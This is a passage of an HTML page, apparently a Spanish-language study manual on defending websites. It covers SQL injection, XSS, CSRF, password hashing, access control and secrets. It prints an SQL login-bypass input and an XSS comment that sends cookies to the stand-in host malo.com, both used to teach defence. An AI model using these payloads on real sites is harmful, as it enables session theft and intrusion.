@@ -1,0 +1,568 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ciberseguridad para páginas web</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,700;12..96,800&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+  :root {
+    --bg: #f4f5f7;
+    --surface: #ffffff;
+    --surface-2: #eceef2;
+    --sidebar: #f8f9fb;
+    --ink: #1a2230;
+    --ink-soft: #46505f;
+    --ink-faint: #6b7686;
+    --line: #d9dde4;
+    --line-strong: #c3c9d3;
+    --accent: #0e7c86;
+    --accent-soft: #d7edef;
+    --code-bg: #f6f4ef;
+    --code-ink: #2a2f3a;
+    --warn: #b0641a;
+    --warn-soft: #f7ecdc;
+    --good: #2f8f56;
+    --good-soft: #dcefe2;
+    --rest: #0e7c86; --soap: #4756b8; --graphql: #d81b8c; --grpc: #2b7fd4; --ws: #c07a17; --hook: #2f9e5b;
+    --py: #3572A5; --js: #b58900;
+    --shadow: 0 1px 2px rgba(20,28,44,.05), 0 10px 28px rgba(20,28,44,.07);
+    --read: 720px;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0f1218; --surface: #1a1f28; --surface-2: #232936; --sidebar: #12161d;
+      --ink: #e8ebf0; --ink-soft: #b3bcca; --ink-faint: #838d9d;
+      --line: #2a313d; --line-strong: #3a4351;
+      --accent: #3fc0cc; --accent-soft: #113035;
+      --code-bg: #13161c; --code-ink: #d3d7de;
+      --warn: #e0a94a; --warn-soft: #2c2415; --good: #57c983; --good-soft: #12271a;
+      --rest: #3fc0cc; --soap: #8b96ea; --graphql: #f472bc; --grpc: #6bb0f0; --ws: #e0a94a; --hook: #57c983;
+      --py: #6ab0e8; --js: #e0c04a;
+      --shadow: 0 1px 2px rgba(0,0,0,.3), 0 12px 32px rgba(0,0,0,.4);
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0f1218; --surface: #1a1f28; --surface-2: #232936; --sidebar: #12161d;
+    --ink: #e8ebf0; --ink-soft: #b3bcca; --ink-faint: #838d9d;
+    --line: #2a313d; --line-strong: #3a4351;
+    --accent: #3fc0cc; --accent-soft: #113035;
+    --code-bg: #13161c; --code-ink: #d3d7de;
+    --warn: #e0a94a; --warn-soft: #2c2415; --good: #57c983; --good-soft: #12271a;
+    --rest: #3fc0cc; --soap: #8b96ea; --graphql: #f472bc; --grpc: #6bb0f0; --ws: #e0a94a; --hook: #57c983;
+    --py: #6ab0e8; --js: #e0c04a;
+    --shadow: 0 1px 2px rgba(0,0,0,.3), 0 12px 32px rgba(0,0,0,.4);
+  }
+
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font-family: "IBM Plex Sans", system-ui, sans-serif; font-size: 17px; line-height: 1.65;
+    -webkit-font-smoothing: antialiased;
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  h1,h2,h3,h4 { font-family: "Bricolage Grotesque","IBM Plex Sans",sans-serif; color: var(--ink); text-wrap: balance; line-height: 1.15; }
+  code, pre, .mono { font-family: "IBM Plex Mono", ui-monospace, monospace; }
+  p, li { color: var(--ink-soft); }
+  p code, li code { background: var(--surface-2); color: var(--ink); padding: 1px 5px; border-radius: 4px; font-size: 14px; }
+
+  /* ---------- layout ---------- */
+  .app { display: grid; grid-template-columns: 288px minmax(0,1fr); min-height: 100vh; }
+  aside {
+    background: var(--sidebar); border-right: 1px solid var(--line);
+    position: sticky; top: 0; height: 100vh; overflow-y: auto; padding: 22px 16px 40px;
+  }
+  .side-head { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; padding: 0 8px; }
+  .logo { font-family: "IBM Plex Mono", monospace; font-weight: 600; font-size: 12px; letter-spacing: .1em; text-transform: uppercase; color: var(--accent); }
+  .side-title { font-family: "Bricolage Grotesque", sans-serif; font-weight: 800; font-size: 19px; line-height: 1.1; margin: 6px 8px 18px; letter-spacing: -.01em; }
+  .part-label { font-family: "IBM Plex Mono", monospace; font-size: 10.5px; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); margin: 18px 8px 6px; }
+  nav.toc a {
+    display: flex; gap: 9px; align-items: baseline; padding: 6px 8px; border-radius: 7px;
+    color: var(--ink-soft); font-size: 14.5px; line-height: 1.35; cursor: pointer;
+  }
+  nav.toc a .n { font-family: "IBM Plex Mono", monospace; font-size: 12px; color: var(--ink-faint); min-width: 18px; }
+  nav.toc a:hover { background: var(--surface-2); text-decoration: none; }
+  nav.toc a.active { background: var(--accent-soft); color: var(--ink); font-weight: 600; }
+  nav.toc a.active .n { color: var(--accent); }
+
+  /* ---------- content ---------- */
+  main { padding: 0; }
+  .reader { max-width: var(--read); margin: 0 auto; padding: 40px 32px 80px; }
+  .topbar { position: sticky; top: 0; z-index: 15; display: flex; align-items: center; gap: 12px;
+    padding: 10px 24px; background: color-mix(in srgb, var(--bg) 86%, transparent); backdrop-filter: blur(10px); border-bottom: 1px solid var(--line); }
+  .menu-btn { display: none; }
+  .progress-wrap { flex: 1; height: 5px; background: var(--surface-2); border-radius: 4px; overflow: hidden; max-width: 320px; }
+  .progress-bar { height: 100%; width: 0; background: var(--accent); transition: width .3s; }
+  .prog-text { font-family: "IBM Plex Mono", monospace; font-size: 12px; color: var(--ink-faint); white-space: nowrap; }
+  .toggle { margin-left: auto; border: 1px solid var(--line-strong); background: var(--surface); color: var(--ink-soft);
+    width: 34px; height: 30px; border-radius: 7px; cursor: pointer; font-size: 15px; display: inline-flex; align-items: center; justify-content: center; }
+  .toggle:hover { border-color: var(--accent); color: var(--accent); }
+  .toggle:focus-visible, nav.toc a:focus-visible, .navbtn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+  .chapter { display: none; }
+  .chapter.active { display: block; animation: fade .25s ease; }
+  @keyframes fade { from { opacity: .4; } to { opacity: 1; } }
+
+  .ch-eyebrow { font-family: "IBM Plex Mono", monospace; font-size: 12.5px; letter-spacing: .12em; text-transform: uppercase; color: var(--accent); font-weight: 600; }
+  .chapter h1 { font-size: clamp(30px, 5vw, 44px); font-weight: 800; letter-spacing: -.02em; margin: 10px 0 0; }
+  .chapter h2 { font-size: 24px; font-weight: 700; margin: 40px 0 10px; padding-top: 8px; }
+  .chapter h3 { font-size: 18px; font-weight: 600; margin: 26px 0 6px; font-family: "IBM Plex Sans", sans-serif; }
+  .chapter p { max-width: none; }
+  .lead { font-size: 19px; color: var(--ink); margin-top: 16px; }
+  .chapter ul, .chapter ol { padding-left: 22px; }
+  .chapter li { margin: 5px 0; }
+
+  pre { background: var(--code-bg); color: var(--code-ink); border: 1px solid var(--line);
+    border-radius: 10px; padding: 15px 17px; overflow-x: auto; font-size: 13.5px; line-height: 1.55; margin: 6px 0 4px; }
+  pre .cm { color: var(--ink-faint); }
+  pre b { color: var(--accent); font-weight: 600; }
+  pre .k { color: var(--graphql); font-weight: 600; }
+  .codehead { display: flex; align-items: center; gap: 8px; margin: 20px 0 0; }
+  .lang { font-family: "IBM Plex Mono", monospace; font-size: 11px; font-weight: 600; letter-spacing: .05em; text-transform: uppercase;
+    padding: 3px 8px; border-radius: 5px; }
+  .lang.py { background: color-mix(in srgb, var(--py) 18%, transparent); color: var(--py); }
+  .lang.js { background: color-mix(in srgb, var(--js) 20%, transparent); color: var(--js); }
+  .lang.sh, .lang.xml, .lang.proto, .lang.txt { background: var(--surface-2); color: var(--ink-soft); }
+  .codehead .cap { font-size: 13px; color: var(--ink-faint); }
+  .tested { margin-left: auto; display: inline-flex; align-items: center; gap: 5px; font-family: "IBM Plex Mono", monospace;
+    font-size: 10.5px; font-weight: 600; letter-spacing: .04em; text-transform: uppercase; color: var(--good);
+    background: var(--good-soft); padding: 3px 8px; border-radius: 20px; }
+  pre.output { border-left: 3px solid var(--good); background: color-mix(in srgb, var(--good-soft) 45%, var(--code-bg)); }
+
+  .box { border: 1px solid var(--line); border-radius: 10px; padding: 14px 18px; margin: 18px 0; background: var(--surface); }
+  .box p:last-child { margin-bottom: 0; } .box p:first-child { margin-top: 0; }
+  .box .tag { font-family: "IBM Plex Mono", monospace; font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; display: block; margin-bottom: 5px; }
+  .box.nota { background: var(--accent-soft); border-color: color-mix(in srgb, var(--accent) 30%, transparent); }
+  .box.nota .tag { color: var(--accent); }
+  .box.ojo { background: var(--warn-soft); border-color: color-mix(in srgb, var(--warn) 35%, transparent); }
+  .box.ojo .tag { color: var(--warn); }
+  .box.nota p, .box.ojo p { color: var(--ink); }
+
+  .table-wrap { overflow-x: auto; margin: 18px 0; border: 1px solid var(--line); border-radius: 10px; }
+  table { border-collapse: collapse; width: 100%; min-width: 560px; font-size: 14px; }
+  th, td { text-align: left; padding: 10px 13px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  thead th { background: var(--surface-2); font-family: "IBM Plex Mono", monospace; font-size: 11.5px; letter-spacing: .04em; text-transform: uppercase; color: var(--ink); }
+  tbody th { font-weight: 600; color: var(--ink); white-space: nowrap; }
+  td { color: var(--ink-soft); }
+  tbody tr:last-child th, tbody tr:last-child td { border-bottom: none; }
+  .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; vertical-align: baseline; }
+
+  .navrow { display: flex; gap: 12px; margin-top: 48px; padding-top: 22px; border-top: 1px solid var(--line); }
+  .navbtn { flex: 1; border: 1px solid var(--line); background: var(--surface); border-radius: 10px; padding: 12px 16px;
+    cursor: pointer; color: var(--ink); text-align: left; font-family: inherit; font-size: 14px; box-shadow: var(--shadow); }
+  .navbtn:hover { border-color: var(--accent); }
+  .navbtn:disabled { opacity: .35; cursor: default; box-shadow: none; }
+  .navbtn .dir { font-family: "IBM Plex Mono", monospace; font-size: 11px; letter-spacing: .06em; text-transform: uppercase; color: var(--ink-faint); display: block; }
+  .navbtn .t { font-weight: 600; }
+  .navbtn.next { text-align: right; }
+
+  .kbd { font-family: "IBM Plex Mono", monospace; font-size: 12px; background: var(--surface-2); border: 1px solid var(--line-strong);
+    border-radius: 5px; padding: 1px 6px; color: var(--ink-soft); }
+
+  .overlay { display: none; }
+  @media (max-width: 860px) {
+    .app { grid-template-columns: 1fr; }
+    aside { position: fixed; z-index: 40; width: 300px; left: 0; top: 0; transform: translateX(-102%); transition: transform .25s; box-shadow: var(--shadow); }
+    aside.open { transform: translateX(0); }
+    .menu-btn { display: inline-flex; border: 1px solid var(--line-strong); background: var(--surface); color: var(--ink);
+      width: 36px; height: 32px; border-radius: 8px; align-items: center; justify-content: center; cursor: pointer; font-size: 17px; }
+    .overlay.show { display: block; position: fixed; inset: 0; background: rgba(0,0,0,.35); z-index: 35; }
+    .reader { padding: 28px 20px 70px; }
+  }
+  @media (prefers-reduced-motion: reduce) { *, html { scroll-behavior: auto; transition: none !important; animation: none !important; } }
+</style>
+
+<div class="app">
+  <div class="overlay" id="overlay"></div>
+  <aside id="sidebar">
+    <div class="side-head"><span class="logo">Manual</span></div>
+    <div class="side-title">Ciberseguridad web</div>
+    <nav class="toc" id="toc"></nav>
+  </aside>
+
+  <main>
+    <div class="topbar">
+      <button class="menu-btn" id="menuBtn" aria-label="Menú">☰</button>
+      <div class="progress-wrap"><div class="progress-bar" id="progBar"></div></div>
+      <span class="prog-text" id="progText">0 / 0</span>
+      <button class="toggle" id="themeBtn" aria-label="Cambiar tema" title="Cambiar tema">◐</button>
+    </div>
+    <div class="reader" id="reader">
+
+<!-- ================= CHAPTERS INJECTED BELOW ================= -->
+<!-- 0 -->
+<section class="chapter" data-part="Empezar" data-num="0" data-title="Cómo usar este libro" id="intro">
+  <div class="ch-eyebrow">Manual de estudio</div>
+  <h1>Ciberseguridad para páginas web</h1>
+  <p class="lead">La mayoría de los hackeos no son magia: son las mismas cinco o seis fallas repetidas. Este libro te enseña a reconocerlas y taparlas, con código vulnerable al lado del seguro. Los bloques con <span class="tested">✓ salida real</span> muestran un ataque funcionando de verdad, y cómo la versión segura lo frena.</p>
+  <div class="box ojo"><span class="tag">Para defender, no para atacar</span><p>Todo lo de este libro es para asegurar tus propias aplicaciones. Los ejemplos de ataque corren contra una base de juguete local, para que veas por qué la defensa importa. Probar estas técnicas contra sistemas ajenos sin permiso es ilegal.</p></div>
+  <h2>Cómo está armado</h2>
+  <ul>
+    <li><strong>Parte 1, fundamentos.</strong> Pensar como atacante, y por qué HTTPS es la base.</li>
+    <li><strong>Parte 2, las clásicas.</strong> Inyección SQL, XSS, CSRF, autenticación y control de acceso. Las que más aparecen.</li>
+    <li><strong>Parte 3, endurecer.</strong> Secretos, headers de seguridad y dependencias.</li>
+    <li><strong>Parte 4, a producción.</strong> Un checklist y glosario.</li>
+  </ul>
+  <div class="navrow"><button class="navbtn" disabled><span class="dir">Inicio</span><span class="t">Este es el comienzo</span></button><button class="navbtn next" data-goto="1"><span class="dir">Siguiente</span><span class="t">Pensar como atacante →</span></button></div>
+</section>
+
+<!-- 1 -->
+<section class="chapter" data-part="Parte 1 · Fundamentos" data-num="1" data-title="Pensar como atacante" id="mentalidad">
+  <div class="ch-eyebrow">Capítulo 1</div>
+  <h1>Pensar como atacante</h1>
+  <p class="lead">La seguridad empieza con un cambio de mentalidad: dejar de asumir que la gente usa tu app como vos esperás. Un atacante hace justo lo que no previste, y a propósito.</p>
+  <h2>La superficie de ataque</h2>
+  <p>Es todo punto por donde entra información a tu sistema: formularios, parámetros de la URL, headers, archivos que suben, la API, las cookies. Cada entrada es una puerta. Cuanto más entiendas por dónde entran datos, mejor sabés qué proteger.</p>
+  <h2>Tres principios que sostienen todo</h2>
+  <ul>
+    <li><strong>Nunca confíes en el cliente.</strong> El principio número uno. Todo lo que llega del navegador puede estar manipulado: el usuario puede editar el HTML, la URL, la request. Validá todo del lado del servidor, siempre. La validación en el frontend es comodidad, no seguridad.</li>
+    <li><strong>Mínimo privilegio.</strong> Cada parte del sistema tiene solo los permisos que necesita, nada más. Si el usuario de la base solo lee, no le des permiso de borrar. Así, un agujero hace menos daño.</li>
+    <li><strong>Defensa en profundidad.</strong> No dependas de una sola barrera. Varias capas de defensa, para que si una falla, otra aguante.</li>
+  </ul>
+  <div class="box nota"><span class="tag">El OWASP Top 10</span><p>OWASP es una organización que publica el "Top 10" de riesgos de seguridad web, la lista de referencia de la industria. Los capítulos de la Parte 2 cubren los que más vas a cruzar. Si te dedicás a esto, leer el OWASP Top 10 completo es tarea obligada.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="0"><span class="dir">Anterior</span><span class="t">← Cómo usar este libro</span></button><button class="navbtn next" data-goto="2"><span class="dir">Siguiente</span><span class="t">HTTPS →</span></button></div>
+</section>
+
+<!-- 2 -->
+<section class="chapter" data-part="Parte 1 · Fundamentos" data-num="2" data-title="HTTPS" id="https">
+  <div class="ch-eyebrow">Capítulo 2</div>
+  <h1>HTTPS: la base de todo</h1>
+  <p class="lead">Antes de cualquier otra defensa, está HTTPS. Sin él, todo lo demás no importa, porque los datos viajan en texto plano y cualquiera en el camino los lee.</p>
+  <h2>Qué resuelve</h2>
+  <p>HTTP manda todo sin cifrar. En una red wifi compartida, alguien puede leer tus contraseñas, tokens y datos mientras viajan. HTTPS agrega TLS, que cifra la conexión entre el navegador y el servidor. Da tres garantías:</p>
+  <ul>
+    <li><strong>Cifrado:</strong> nadie en el medio puede leer lo que viaja.</li>
+    <li><strong>Integridad:</strong> nadie puede modificar los datos en tránsito sin que se note.</li>
+    <li><strong>Autenticidad:</strong> el certificado prueba que hablás con el servidor real y no con un impostor.</li>
+  </ul>
+  <h2>En la práctica</h2>
+  <p>Hoy HTTPS es gratis y automático. Let's Encrypt da certificados sin costo, y la mayoría de los proveedores (los del librito de Docker) lo configuran solos. No hay excusa para HTTP en producción.</p>
+  <div class="box ojo"><span class="tag">Forzá HTTPS</span><p>No alcanza con soportar HTTPS: hay que redirigir todo HTTP a HTTPS, y usar el header <code>Strict-Transport-Security</code> (lo vemos en el capítulo de headers) para que el navegador nunca intente la versión insegura. Y las cookies sensibles van con el flag <code>Secure</code>, para que solo viajen por HTTPS.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="1"><span class="dir">Anterior</span><span class="t">← Pensar como atacante</span></button><button class="navbtn next" data-goto="3"><span class="dir">Siguiente</span><span class="t">Inyección SQL →</span></button></div>
+</section>
+
+<!-- 3 -->
+<section class="chapter" data-part="Parte 2 · Las vulnerabilidades clásicas" data-num="3" data-title="Inyección SQL" id="sqli">
+  <div class="ch-eyebrow">Capítulo 3</div>
+  <h1>Inyección SQL</h1>
+  <p class="lead">La vulnerabilidad más famosa y todavía una de las más comunes. Pasa cuando pegás texto del usuario dentro de una consulta SQL, y ese texto termina ejecutándose como código.</p>
+  <h2>El ataque, funcionando</h2>
+  <p>Un login que arma la query concatenando el nombre de usuario. El atacante no manda un nombre: manda un pedazo de SQL. Esto corrió de verdad:</p>
+  <div class="codehead"><span class="lang txt">inyección real</span><span class="tested">✓ salida real</span></div>
+<pre class="output">### Entrada del atacante: "' OR '1'='1"
+
+VULNERABLE (concatenando):
+  SQL armado: SELECT id, usuario FROM usuarios WHERE usuario = '' OR '1'='1'
+  resultado: [(1, 'carlos'), (2, 'ana'), (3, 'admin')]
+  -> devolvió TODA la tabla. El atacante entró sin usuario válido.
+
+SEGURO (parametrizado):
+  resultado: []
+  -> vacío. El ataque se trató como un nombre de usuario literal.</pre>
+  <p>Mirá el SQL armado: el <code>' OR '1'='1</code> cierra la comilla y agrega una condición siempre verdadera. La query devuelve todo. Con variantes de esto se roban tablas enteras, se saltean logins, o se borra la base.</p>
+  <h2>El código</h2>
+  <div class="codehead"><span class="lang py">mal vs bien</span></div>
+<pre><span class="cm"># MAL: el texto del usuario se vuelve parte del SQL</span>
+q = "SELECT * FROM usuarios WHERE usuario = '" + usuario + "'"
+cur.execute(q)
+
+<span class="cm"># BIEN: parámetro. El motor lo trata como dato, nunca como código</span>
+cur.execute("SELECT * FROM usuarios WHERE usuario = ?", (usuario,))</pre>
+  <div class="box nota"><span class="tag">La defensa, en una frase</span><p>Nunca construyas SQL pegando texto. Usá siempre consultas parametrizadas (<code>?</code> o <code>$1</code>). El motor se encarga de que el dato jamás se ejecute como código. Un ORM (del librito de SQL) hace esto por vos por defecto.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="2"><span class="dir">Anterior</span><span class="t">← HTTPS</span></button><button class="navbtn next" data-goto="4"><span class="dir">Siguiente</span><span class="t">XSS →</span></button></div>
+</section>
+
+<!-- 4 -->
+<section class="chapter" data-part="Parte 2 · Las vulnerabilidades clásicas" data-num="4" data-title="XSS" id="xss">
+  <div class="ch-eyebrow">Capítulo 4</div>
+  <h1>XSS: inyección en el navegador</h1>
+  <p class="lead">Cross-Site Scripting es la prima de la inyección SQL, pero del lado del navegador. Pasa cuando mostrás texto del usuario en tu página sin limpiarlo, y ese texto incluye código JavaScript que se ejecuta en la máquina de otros visitantes.</p>
+  <h2>Cómo funciona</h2>
+  <p>Imaginá un campo de comentarios. Un atacante deja este "comentario":</p>
+  <div class="codehead"><span class="lang txt">el comentario malicioso</span></div>
+<pre>&lt;script&gt;fetch('https://malo.com/robar?c=' + document.cookie)&lt;/script&gt;</pre>
+  <p>Si tu página inserta ese texto tal cual en el HTML, cada persona que vea el comentario ejecuta ese script, y su cookie de sesión se va al servidor del atacante. Con esa cookie, el atacante se hace pasar por la víctima.</p>
+  <h2>La defensa: escapar la salida</h2>
+  <p>Escapar significa convertir los caracteres especiales del HTML en texto inofensivo: <code>&lt;</code> se vuelve <code>&amp;lt;</code>, así el navegador lo muestra como texto y no lo ejecuta.</p>
+  <div class="codehead"><span class="lang js">mal vs bien</span></div>
+<pre><span class="cm">// MAL: inserta HTML crudo, el script se ejecuta</span>
+elemento.innerHTML = comentario;
+
+<span class="cm">// BIEN: inserta como texto, nunca se ejecuta</span>
+elemento.textContent = comentario;</pre>
+  <p>La buena noticia: los frameworks modernos (React, Vue, Angular) escapan la salida por defecto. Mientras no fuerces la inserción de HTML crudo (el <code>dangerouslySetInnerHTML</code> de React deja ver el peligro en el nombre), estás cubierto.</p>
+  <div class="box nota"><span class="tag">Escapá según el contexto</span><p>El escape correcto depende de dónde va el dato: dentro de HTML, de un atributo, de una URL o de JavaScript, cada uno tiene sus reglas. Por eso conviene apoyarse en el framework y en librerías probadas en vez de escapar a mano. Y como capa extra, el header <code>Content-Security-Policy</code> (capítulo de headers) limita qué scripts puede correr la página.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="3"><span class="dir">Anterior</span><span class="t">← Inyección SQL</span></button><button class="navbtn next" data-goto="5"><span class="dir">Siguiente</span><span class="t">CSRF →</span></button></div>
+</section>
+
+<!-- 5 -->
+<section class="chapter" data-part="Parte 2 · Las vulnerabilidades clásicas" data-num="5" data-title="CSRF" id="csrf">
+  <div class="ch-eyebrow">Capítulo 5</div>
+  <h1>CSRF: acciones que no pediste</h1>
+  <p class="lead">Cross-Site Request Forgery engaña a tu navegador para que haga una acción en un sitio donde ya estás logueado, sin que vos quieras. Aprovecha que el navegador manda tus cookies automáticamente.</p>
+  <h2>El escenario</h2>
+  <p>Estás logueado en tu banco en una pestaña. En otra, abrís una página maliciosa que tiene escondido un formulario que se envía solo a <code>tubanco.com/transferir</code>. Como tu navegador manda la cookie de sesión del banco en toda request a ese dominio, la transferencia se ejecuta con tu sesión. Vos nunca la pediste.</p>
+  <h2>La defensa: el token CSRF</h2>
+  <p>La idea: exigir en cada acción sensible un valor secreto que solo tu propio sitio conoce y que el atacante no puede adivinar. El servidor genera un token único por sesión, lo pone en tus formularios, y rechaza cualquier request que no lo traiga.</p>
+  <div class="codehead"><span class="lang txt">el token en el formulario</span></div>
+<pre>&lt;form method="POST" action="/transferir"&gt;
+  &lt;input type="hidden" name="csrf_token" value="a8f3...token único"&gt;
+  ...
+&lt;/form&gt;
+<span class="cm"># el servidor verifica que el token coincida con el de tu sesión.
+# la página del atacante no puede conocerlo, así que su request falla.</span></pre>
+  <div class="box nota"><span class="tag">En la práctica</span><p>Casi todos los frameworks traen protección CSRF incorporada, a veces activada por defecto. Además, marcar las cookies con <code>SameSite=Lax</code> o <code>Strict</code> hace que no se manden en requests que vienen de otros sitios, lo que corta la raíz del ataque. Las APIs que usan tokens en el header (no cookies) son inmunes por diseño.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="4"><span class="dir">Anterior</span><span class="t">← XSS</span></button><button class="navbtn next" data-goto="6"><span class="dir">Siguiente</span><span class="t">Autenticación →</span></button></div>
+</section>
+
+<!-- 6 -->
+<section class="chapter" data-part="Parte 2 · Las vulnerabilidades clásicas" data-num="6" data-title="Autenticación" id="auth">
+  <div class="ch-eyebrow">Capítulo 6</div>
+  <h1>Autenticación: guardar contraseñas bien</h1>
+  <p class="lead">Si tu base se filtra (pasa seguido), lo que decide si es una catástrofe o un susto es cómo guardaste las contraseñas. La regla es absoluta: nunca en texto plano.</p>
+  <h2>Hashing con sal</h2>
+  <p>No guardás la contraseña, guardás un <strong>hash</strong>: el resultado de pasarla por una función de un solo sentido, imposible de revertir. Cuando el usuario entra, hasheás lo que escribió y comparás los hashes. La contraseña real nunca se guarda.</p>
+  <p>La <strong>sal</strong> es un valor aleatorio único por usuario que se agrega antes de hashear. Hace que dos personas con la misma contraseña tengan hashes distintos, y arruina las "rainbow tables" (tablas precalculadas de hashes comunes). Esto corrió de verdad, con bcrypt:</p>
+  <div class="codehead"><span class="lang txt">bcrypt</span><span class="tested">✓ salida real</span></div>
+<pre class="output">misma contraseña, hash 1: $2b$12$jpH0nHw9o89vHklwAybIY.29yDg5C0YL214Zp4jaQOyMf ...
+misma contraseña, hash 2: $2b$12$6xkVRP91D3bxPxrqA5RHgOcLZmlSLhwPOQhkTRXcdxMIh ...
+-> distintos, por la sal aleatoria. Eso frena las 'rainbow tables'.
+
+verificar login correcto: True
+verificar login incorrecto: False</pre>
+  <div class="codehead"><span class="lang py">el código</span></div>
+<pre>import bcrypt
+<span class="cm"># al registrarse: hashear y guardar el hash</span>
+hash = bcrypt.hashpw(password, bcrypt.gensalt())
+<span class="cm"># al loguearse: verificar</span>
+bcrypt.checkpw(password_ingresada, hash)   <span class="cm"># True o False</span></pre>
+  <div class="box ojo"><span class="tag">Usá el algoritmo correcto</span><p>No uses <code>md5</code> ni <code>sha1</code> para contraseñas: son rápidos, y eso los hace fáciles de atacar por fuerza bruta. Usá algoritmos hechos para esto, lentos a propósito: <strong>bcrypt</strong>, <strong>argon2</strong> o <strong>scrypt</strong>. Y nunca inventes tu propio esquema de hashing.</p></div>
+  <h2>Otras defensas de login</h2>
+  <ul>
+    <li>Limitá los intentos de login (rate limiting) para frenar la fuerza bruta.</li>
+    <li>Ofrecé segundo factor (2FA) para las cuentas importantes.</li>
+    <li>Exigí contraseñas razonables, y chequealas contra listas de las más filtradas.</li>
+  </ul>
+  <div class="navrow"><button class="navbtn" data-goto="5"><span class="dir">Anterior</span><span class="t">← CSRF</span></button><button class="navbtn next" data-goto="7"><span class="dir">Siguiente</span><span class="t">Control de acceso →</span></button></div>
+</section>
+
+<!-- 7 -->
+<section class="chapter" data-part="Parte 2 · Las vulnerabilidades clásicas" data-num="7" data-title="Control de acceso" id="acceso">
+  <div class="ch-eyebrow">Capítulo 7</div>
+  <h1>Control de acceso roto</h1>
+  <p class="lead">Saber quién sos (autenticación) es una cosa. Chequear qué podés hacer (autorización) es otra, y es la que más se olvida. El resultado son usuarios que acceden a datos que no son suyos.</p>
+  <h2>IDOR: el ID que se cambia a mano</h2>
+  <p>El caso clásico. Tu app muestra la factura en <code>/facturas/42</code>. El usuario cambia la URL a <code>/facturas/43</code> y ve la factura de otro, porque el servidor devolvió la factura sin chequear que sea suya. Se llama Insecure Direct Object Reference.</p>
+  <div class="codehead"><span class="lang py">mal vs bien</span></div>
+<pre><span class="cm"># MAL: devuelve la factura sin verificar de quién es</span>
+@app.get("/facturas/{id}")
+def factura(id):
+    return db.facturas.get(id)
+
+<span class="cm"># BIEN: verifica que la factura sea del usuario logueado</span>
+@app.get("/facturas/{id}")
+def factura(id, usuario=usuario_actual()):
+    f = db.facturas.get(id)
+    if f.usuario_id != usuario.id:
+        raise HTTPException(403)      <span class="cm"># prohibido</span>
+    return f</pre>
+  <h2>La regla</h2>
+  <p>En cada acción sobre un recurso, verificá dos cosas: que el usuario esté logueado (autenticación) y que tenga permiso sobre <em>ese</em> recurso puntual (autorización). No alcanza con esconder el botón en el frontend: el atacante le pega directo a la API. El chequeo va en el servidor, en cada endpoint.</p>
+  <div class="box ojo"><span class="tag">Negá por defecto</span><p>Diseñá el acceso al revés: todo prohibido, y vas habilitando lo permitido. Así, si te olvidás de proteger un endpoint nuevo, queda cerrado por defecto, no abierto. El error tiene que ser hacia la seguridad.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="6"><span class="dir">Anterior</span><span class="t">← Autenticación</span></button><button class="navbtn next" data-goto="8"><span class="dir">Siguiente</span><span class="t">Secretos →</span></button></div>
+</section>
+
+<!-- 8 -->
+<section class="chapter" data-part="Parte 3 · Endurecer" data-num="8" data-title="Secretos" id="secretos">
+  <div class="ch-eyebrow">Capítulo 8</div>
+  <h1>Manejar secretos</h1>
+  <p class="lead">Claves de API, tokens, contraseñas de bases: los secretos filtrados son una de las causas más comunes de incidentes, y casi siempre por el mismo error tonto.</p>
+  <h2>El error: secretos en el código</h2>
+  <div class="codehead"><span class="lang py">nunca hagas esto</span></div>
+<pre>STRIPE_KEY = "sk_live_51H8xY2..."   <span class="cm"># MAL: hardcodeado en el código</span></pre>
+  <p>En cuanto eso entra a Git, queda en la historia para siempre, aunque después lo borres. Si el repo es público o se filtra, cualquiera lo tiene. Hay bots que escanean GitHub buscando justo esto, en segundos.</p>
+  <h2>Lo correcto: variables de entorno</h2>
+  <div class="codehead"><span class="lang py">bien</span></div>
+<pre>import os
+STRIPE_KEY = os.environ["STRIPE_KEY"]   <span class="cm"># viene del entorno, no del código</span></pre>
+  <p>El secreto vive fuera del código: en un archivo <code>.env</code> local (que va en el <code>.gitignore</code>, del librito de Git), y en producción, en el gestor de secretos del proveedor o en los secrets de tu pipeline (del librito de CI/CD).</p>
+  <div class="box ojo"><span class="tag">Si se filtró, rotalo</span><p>La primera acción ante un secreto filtrado no es borrarlo del código: es <strong>rotarlo</strong>, o sea generar uno nuevo e invalidar el viejo. Mientras el viejo siga activo, no importa que lo hayas borrado del repo, alguien ya lo puede tener.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="7"><span class="dir">Anterior</span><span class="t">← Control de acceso</span></button><button class="navbtn next" data-goto="9"><span class="dir">Siguiente</span><span class="t">Headers y CORS →</span></button></div>
+</section>
+
+<!-- 9 -->
+<section class="chapter" data-part="Parte 3 · Endurecer" data-num="9" data-title="Headers y CORS" id="headers">
+  <div class="ch-eyebrow">Capítulo 9</div>
+  <h1>Headers de seguridad y CORS</h1>
+  <p class="lead">Unos pocos headers HTTP en las respuestas de tu servidor le dan instrucciones de seguridad al navegador. Son fáciles de agregar y suben mucho la defensa.</p>
+  <h2>Los headers que importan</h2>
+  <div class="table-wrap"><table>
+    <thead><tr><th>Header</th><th>Qué hace</th></tr></thead>
+    <tbody>
+      <tr><th>Strict-Transport-Security</th><td>Obliga al navegador a usar siempre HTTPS con tu sitio.</td></tr>
